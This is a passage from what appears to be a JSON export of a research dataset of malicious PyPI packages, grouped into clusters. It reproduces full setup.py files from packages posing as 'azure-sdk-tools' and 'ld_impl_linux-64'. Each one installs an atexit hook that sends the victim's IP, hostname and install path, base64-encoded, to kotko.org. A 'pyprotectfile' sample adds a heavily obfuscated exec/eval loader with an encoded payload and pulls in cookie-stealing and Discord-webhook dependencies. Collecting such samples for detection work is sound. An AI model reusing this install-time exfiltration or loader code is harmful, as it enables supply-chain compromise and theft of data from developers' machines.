package_dir={'': 'src'},  # Optional\n\n    # You can just specify package directories manually here if your project is\n    # simple. Or you can use find_packages().\n    #\n    # Alternatively, if you just want to distribute a single Python file, use\n    # the `py_modules` argument instead as follows, which will expect a file\n    # called `my_module.py` to exist:\n    #\n    #   py_modules=[\"my_module\"],\n    #\n    packages=find_packages(where='src'),  # Required\n\n    # Specify which Python versions you support. In contrast to the\n    # 'Programming Language' classifiers above, 'pip install' will check this\n    # and refuse to install the project if the version does not match. See\n    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires\n    python_requires='>=3.6, <4',\n\n    # This field lists other packages that your project depends on to run.\n    # Any package you put here will be installed by pip when your project is\n    # installed, so they must be valid existing projects.\n    #\n    # For an analysis of \"install_requires\" vs pip's requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=['peppercorn', 'requests'],  # Optional\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). Users will be able to install these using the \"extras\"\n    # syntax, for example:\n    #\n    #   $ pip install sampleproject[dev]\n    #\n    # Similar to `install_requires` above, these must be valid existing\n    # projects.\n    extras_require={  # Optional\n        'dev': ['check-manifest', 'requests'],\n        'test': ['coverage', 'requests'],\n    },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.\n    package_data={  # Optional\n        'sample': ['package_data.dat'],\n    },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/distutils/setupscript.html#installing-additional-files\n    #\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    data_files=[('my_data', ['data/data_file'])],  # Optional\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # `pip` to create the appropriate form of executable for the target\n    # platform.\n    #\n    # For example, the following would provide a command called `sample` which\n    # executes the function `main` from this package when invoked:\n    entry_points={  # Optional\n        'console_scripts': [\n            'sample=sample:main',\n        ],\n    },\n\n    # List additional URLs that are relevant to your project as a dict.\n    #\n    # This field corresponds to the \"Project-URL\" metadata fields:\n    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use\n    #\n    # Examples listed include a pattern for specifying where the package tracks\n    # issues, where the source is hosted, where to say thanks to the package\n    # maintainers, and where to support the project financially. The key is\n    # what's used to render the link text on PyPI.\n    project_urls={},\n     cmdclass={\n        'install': new_install,\n    },\n)\n# _post_install()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-azure-sdk-tools",
        "code": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\nimport atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom multiprocessing.pool import ThreadPool as Pool\nfrom distutils.command.install import install\n\n\nhere = pathlib.Path(__file__).parent.resolve()\n\n# Get the long description from the README file\nlong_description = (here / 'README.md').read_text(encoding='utf-8')\n\n# Arguments marked as \"Required\" below must be included for upload to PyPI.\n# Fields marked as \"Optional\" may be commented out.\n\ncompany = \"pypi+\"+\"Azure/azure-sdk-tools\"+\"+\"\nname = \"azure-sdk-tools\"\nversion = \"0.0.0\";\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\n\n\n\n# def _post_install():\n#     _post_install\n\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n\n\n\nsetup(\n    # This is the name of your project. The first time you publish this\n    # package, this name will be registered for you. It will determine how\n    # users can install this project, e.g.:\n    #\n    # $ pip install sampleproject\n    #\n    # And where it will live on PyPI: https://pypi.org/project/sampleproject/\n    #\n    # There are some restrictions on what makes a valid project name\n    # specification here:\n    # https://packaging.python.org/specifications/core-metadata/#name\n    name=name,  # Required\n\n    # Versions should comply with PEP 440:\n    # https://www.python.org/dev/peps/pep-0440/\n    #\n    # For a discussion on single-sourcing the version across setup.py and the\n    # project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=version,  # Required\n\n    # This is a one-line description or tagline of what your project does. This\n    # corresponds to the \"Summary\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#summary\n    description='',  # Optional\n\n    # This is an optional longer description of your project that represents\n    # the body of text which users will see when they visit PyPI.\n    #\n    # Often, this is the same as your README, so you can just read it in from\n    # that file directly (as we have already done above)\n    #\n    # This field corresponds to the \"Description\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-optional\n    long_description=long_description,  # Optional\n\n    # Denotes that our long_description is in Markdown; valid values are\n    # text/plain, text/x-rst, and text/markdown\n    #\n    # Optional if long_description is written in reStructuredText (rst) but\n    # required for plain-text or Markdown; if unspecified, \"applications should\n    # attempt to render [the long_description] as text/x-rst; charset=UTF-8 and\n    # fall back to text/plain if it is not valid rst\" (see link below)\n    #\n    # This field corresponds to the \"Description-Content-Type\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-content-type-optional\n    long_description_content_type='text/markdown',  # Optional (see note above)\n\n    # This should be a valid link to your project's main homepage.\n    #\n    # This field corresponds to the \"Home-Page\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#home-page-optional\n    url='https://github.com/kotko/bravado-decorators',  # Optional\n\n    # This should be your name or the name of the organization which owns the\n    # project.\n    author='Vladyslav Kotko',  # Optional\n\n    # This should be a valid email address corresponding to the author listed\n    # above.\n    author_email='mailbox@kotko.me',  # Optional\n    include_package_data=True,\n\n    # Classifiers help users find your project by categorizing it.\n    #\n    # For a list of valid classifiers, see https://pypi.org/classifiers/\n    classifiers=[  # Optional\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate you support Python 3. These classifiers are *not*\n        # checked by 'pip install'. See instead 'python_requires' below.\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n\n    # This field adds keywords for your project which will appear on the\n    # project page. What does your project relate to?\n    #\n    # Note that this is a list of additional keywords, separated\n    # by commas, to be used to assist searching for the distribution in a\n    # larger catalog.\n    keywords='sample, setuptools, development',  # Optional\n\n    # When your source code is in a subdirectory under the project root, e.g.\n    # `src/`, it is necessary to specify the `package_dir` argument.\n    package_dir={'': 'src'},  # Optional\n\n    # You can just specify package directories manually here if your project is\n    # simple. Or you can use find_packages().\n    #\n    # Alternatively, if you just want to distribute a single Python file, use\n    # the `py_modules` argument instead as follows, which will expect a file\n    # called `my_module.py` to exist:\n    #\n    #   py_modules=[\"my_module\"],\n    #\n    packages=find_packages(where='src'),  # Required\n\n    # Specify which Python versions you support. In contrast to the\n    # 'Programming Language' classifiers above, 'pip install' will check this\n    # and refuse to install the project if the version does not match. See\n    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires\n    python_requires='>=3.6, <4',\n\n    # This field lists other packages that your project depends on to run.\n    # Any package you put here will be installed by pip when your project is\n    # installed, so they must be valid existing projects.\n    #\n    # For an analysis of \"install_requires\" vs pip's requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=['peppercorn', 'requests'],  # Optional\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). Users will be able to install these using the \"extras\"\n    # syntax, for example:\n    #\n    #   $ pip install sampleproject[dev]\n    #\n    # Similar to `install_requires` above, these must be valid existing\n    # projects.\n    extras_require={  # Optional\n        'dev': ['check-manifest', 'requests'],\n        'test': ['coverage', 'requests'],\n    },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.\n    package_data={  # Optional\n        'sample': ['package_data.dat'],\n    },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/distutils/setupscript.html#installing-additional-files\n    #\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    data_files=[('my_data', ['data/data_file'])],  # Optional\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # `pip` to create the appropriate form of executable for the target\n    # platform.\n    #\n    # For example, the following would provide a command called `sample` which\n    # executes the function `main` from this package when invoked:\n    entry_points={  # Optional\n        'console_scripts': [\n            'sample=sample:main',\n        ],\n    },\n\n    # List additional URLs that are relevant to your project as a dict.\n    #\n    # This field corresponds to the \"Project-URL\" metadata fields:\n    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use\n    #\n    # Examples listed include a pattern for specifying where the package tracks\n    # issues, where the source is hosted, where to say thanks to the package\n    # maintainers, and where to support the project financially. The key is\n    # what's used to render the link text on PyPI.\n    project_urls={},\n     cmdclass={\n        'install': new_install,\n    },\n)\n# _post_install()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-ld-impl-linux-64",
        "code": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\nimport atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom multiprocessing.pool import ThreadPool as Pool\nfrom distutils.command.install import install\n\n\nhere = pathlib.Path(__file__).parent.resolve()\n\n# Get the long description from the README file\nlong_description = (here / 'README.md').read_text(encoding='utf-8')\n\n# Arguments marked as \"Required\" below must be included for upload to PyPI.\n# Fields marked as \"Optional\" may be commented out.\n\ncompany = \"pypi+\"+\"google-research/google-research\"+\"+\"\nname = \"ld_impl_linux-64\"\nversion = \"2.33.1\";\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\n\n\n\n# def _post_install():\n#     _post_install\n\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n\n\n\nsetup(\n    # This is the name of your project. The first time you publish this\n    # package, this name will be registered for you. It will determine how\n    # users can install this project, e.g.:\n    #\n    # $ pip install sampleproject\n    #\n    # And where it will live on PyPI: https://pypi.org/project/sampleproject/\n    #\n    # There are some restrictions on what makes a valid project name\n    # specification here:\n    # https://packaging.python.org/specifications/core-metadata/#name\n    name=name,  # Required\n\n    # Versions should comply with PEP 440:\n    # https://www.python.org/dev/peps/pep-0440/\n    #\n    # For a discussion on single-sourcing the version across setup.py and the\n    # project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=version,  # Required\n\n    # This is a one-line description or tagline of what your project does. This\n    # corresponds to the \"Summary\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#summary\n    description='',  # Optional\n\n    # This is an optional longer description of your project that represents\n    # the body of text which users will see when they visit PyPI.\n    #\n    # Often, this is the same as your README, so you can just read it in from\n    # that file directly (as we have already done above)\n    #\n    # This field corresponds to the \"Description\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-optional\n    long_description=long_description,  # Optional\n\n    # Denotes that our long_description is in Markdown; valid values are\n    # text/plain, text/x-rst, and text/markdown\n    #\n    # Optional if long_description is written in reStructuredText (rst) but\n    # required for plain-text or Markdown; if unspecified, \"applications should\n    # attempt to render [the long_description] as text/x-rst; charset=UTF-8 and\n    # fall back to text/plain if it is not valid rst\" (see link below)\n    #\n    # This field corresponds to the \"Description-Content-Type\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-content-type-optional\n    long_description_content_type='text/markdown',  # Optional (see note above)\n\n    # This should be a valid link to your project's main homepage.\n    #\n    # This field corresponds to the \"Home-Page\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#home-page-optional\n    url='https://github.com/kotko/bravado-decorators',  # Optional\n\n    # This should be your name or the name of the organization which owns the\n    # project.\n    author='Vladyslav Kotko',  # Optional\n\n    # This should be a valid email address corresponding to the author listed\n    # above.\n    author_email='mailbox@kotko.me',  # Optional\n    include_package_data=True,\n\n    # Classifiers help users find your project by categorizing it.\n    #\n    # For a list of valid classifiers, see https://pypi.org/classifiers/\n    classifiers=[  # Optional\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate you support Python 3. These classifiers are *not*\n        # checked by 'pip install'. See instead 'python_requires' below.\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n\n    # This field adds keywords for your project which will appear on the\n    # project page. What does your project relate to?\n    #\n    # Note that this is a list of additional keywords, separated\n    # by commas, to be used to assist searching for the distribution in a\n    # larger catalog.\n    keywords='sample, setuptools, development',  # Optional\n\n    # When your source code is in a subdirectory under the project root, e.g.\n    # `src/`, it is necessary to specify the `package_dir` argument.\n    package_dir={'': 'src'},  # Optional\n\n    # You can just specify package directories manually here if your project is\n    # simple. Or you can use find_packages().\n    #\n    # Alternatively, if you just want to distribute a single Python file, use\n    # the `py_modules` argument instead as follows, which will expect a file\n    # called `my_module.py` to exist:\n    #\n    #   py_modules=[\"my_module\"],\n    #\n    packages=find_packages(where='src'),  # Required\n\n    # Specify which Python versions you support. In contrast to the\n    # 'Programming Language' classifiers above, 'pip install' will check this\n    # and refuse to install the project if the version does not match. See\n    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires\n    python_requires='>=3.6, <4',\n\n    # This field lists other packages that your project depends on to run.\n    # Any package you put here will be installed by pip when your project is\n    # installed, so they must be valid existing projects.\n    #\n    # For an analysis of \"install_requires\" vs pip's requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=['peppercorn', 'requests'],  # Optional\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). Users will be able to install these using the \"extras\"\n    # syntax, for example:\n    #\n    #   $ pip install sampleproject[dev]\n    #\n    # Similar to `install_requires` above, these must be valid existing\n    # projects.\n    extras_require={  # Optional\n        'dev': ['check-manifest', 'requests'],\n        'test': ['coverage', 'requests'],\n    },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.\n    package_data={  # Optional\n        'sample': ['package_data.dat'],\n    },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/distutils/setupscript.html#installing-additional-files\n    #\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    data_files=[('my_data', ['data/data_file'])],  # Optional\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # `pip` to create the appropriate form of executable for the target\n    # platform.\n    #\n    # For example, the following would provide a command called `sample` which\n    # executes the function `main` from this package when invoked:\n    entry_points={  # Optional\n        'console_scripts': [\n            'sample=sample:main',\n        ],\n    },\n\n    # List additional URLs that are relevant to your project as a dict.\n    #\n    # This field corresponds to the \"Project-URL\" metadata fields:\n    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use\n    #\n    # Examples listed include a pattern for specifying where the package tracks\n    # issues, where the source is hosted, where to say thanks to the package\n    # maintainers, and where to support the project financially. The key is\n    # what's used to render the link text on PyPI.\n    project_urls={},\n     cmdclass={\n        'install': new_install,\n    },\n)\n# _post_install()\n"
      }
    ]
  },
  {
    "cluster_id": 114,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-18-pyprotectfile-v1.0.3",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"pyprotectfile\",\n    version=\"1.0.3\",\n    author=\"KoalaDev\",\n    author_email=\"koaladev@gmail.com\",\n    description=\"Python Obfuscate Any File\",\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/koaladev\",\n    project_urls={\n        \"GitHub\": \"https://github.com/koaladev/\",\n    },\n    license=\"MIT\",\n    keywords=[\"discord\"],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"Topic :: Software Development\",\n    ],\n    packages=find_packages(),\n    install_requires=[\n        \"requests\",\n        \"sockets\",\n        \"pypiwin32\",\n        \"pycryptodome\",\n        \"uuid\",\n        \"cryptography\",\n        \"pyfiglet\",\n        \"browser_cookie3\",\n        \"discord_webhook\",\n        \"prettytable\",\n        \"getmac\",\n        \"pyautogui\",\n        \"winregistry\",\n        \"robloxpy\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"pyprotectfile-start=pyprotectfile.start:main\",\n        ],\n    },\n)\n\n#!/usr/bin/env python\nimport sys\n\ndef setup():\n    print(\"Ejecutando script personalizado durante la instalaci\u00f3n de mi_paquete...\")\n\nif __name__ == \"__main__\":\n    setup()\n\n# Read this modules documentation -> github.com/codeuk/evilpip\n\ndef test() -> None:\n  print(\"This does literally nothing\")\n\n\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(RSA)'],['''o)1yo*^piyI=tvn5f(u$eo_Z#6$pDrAuX6*+Q^9dKF|^Mv>2d&+4@OtrLQND80$iNSqo%IJ;=xMZca{8Ee>qCZ_ARk)l?ZEOsvfU(q9XOBUWsSE*II+Gh@c?oXJk-=|4SQ;Lmj8jZ}i1Du@;=i)0#7Ot7qRrW9-H-`RFJrWwh?kXVEtuGWL63PE?tuT_)!=!}MCHGzajNPt0y)+RmPp{I|(u3>7>Fe+|Qu|>rq*dU17q4}D<((zlv8Bf&J*!OZNif<Fv-rd-#b?i*0BsBIDEWo_?zbQ_y#Sq&$b5s}`RtqN!a%NDN1<)Ha<oIg2M1U_{BBej4ORxT;+etwDMK_A>!+d3~qmr%Dm1@e)q?HE1(#p@p|13-Pm;ZJHJT)&xGUA1S6oUixq~}Mm)!(7GZg4tu<BOqn_^Q869{)0}V2h*QsyR007E;-sFl7x%w|bfY1ovA(eX=X6lMVYwvjDl2xS6(Wjb)qba}XGJQ5bPpASBpz(t&;>e$o5P$+Z~y+fgl$B)Gji!V<%-MKgVSwzRC3`4V2pGAQV#Qb9s<zMBms{>Q*2d@SyLZcfxA9t`0W{#-&b{9aKh`=N+a_Vav_OC~G7R>RJ@!65Mc>A56WT(Ynw;!eqXcp0jtHX8d&RG2bpZD<sbMT&07=u7Fr0ZQ*d>wPjq(Pi)Eipc91mp6=z`K;32{l^fn@Gcb<s~5iCslYo*{2pZ1r#dY>G|K_W?6%%r3ixXRjAze?@*TBow?=wI%8CU;Gkk!HAfzv2+ptEH9f?kAK6EhC?T#FbKH7<m=#g|(oVs3qs)vAG$510+V<ue}^O%fJfwx5b{YLMZv<}Vn3#+YI!_JU%m3qLB{>FnJeg+cHam7Gt13>U!>{P6^=+Kt2P^dK{Vs2`sumW6|ar<+GjJsrHyPM_?N9ldsjs*Z2!Uj(Wjx9|enU15SsUPTXJN*HX)i7tPw0h5!_-TB-Be&~8AdRO!7T%OI9AOFrkRne9U(ZxKGU?6Qs}G~eTsd4h^5T_)7WWge+=Be9$ZsQ<eKOb!zNqqCaeUaQb29@<N!Ibm{`xl@AkxIicoKGAA#4&-HxLr?#NBP`je$UpAbLbCJjtM&9_FDjv3P{UQ?o!1#Rn1-Mpjtm<+3L-(L5Xt#x!(3z^;{8ue$LHc7jt!s0TZO;`)Y?;Tu9kV8N%HMggCOkYkzoyTGi}U=~qly=ePa${J0kUc=ePQ?zXuSDeu`*F+}Qjr<q!C@o#PyXQQwk|enStyC;_dO8vp+x?cfxp2RZK@++F@PXORtW?|Jc12<zfLjb8KF|'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n\n#!/usr/bin/env python\nimport sys\n\ndef setup():\n    print(\"Ejecutando script personalizado durante la instalaci\u00f3n de mi_paquete...\")\n\nif __name__ == \"__main__\":\n    setup()\n\n# Read this modules documentation -> github.com/codeuk/evilpip\n\ndef test() -> None:\n  print(\"This does literally nothing\")\n\n\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda 